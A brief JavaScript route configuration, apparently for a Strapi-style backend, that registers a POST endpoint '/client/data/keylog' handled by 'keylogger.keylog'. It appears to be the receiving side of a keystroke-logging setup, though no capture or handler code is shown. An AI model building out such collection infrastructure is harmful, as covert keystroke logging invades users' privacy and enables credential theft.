module.exports = {
  routes: [
    {
      method: 'POST',
      path: '/client/data/keylog',
      handler: 'keylogger.keylog',
      config: {
      },
    }
  ],
};
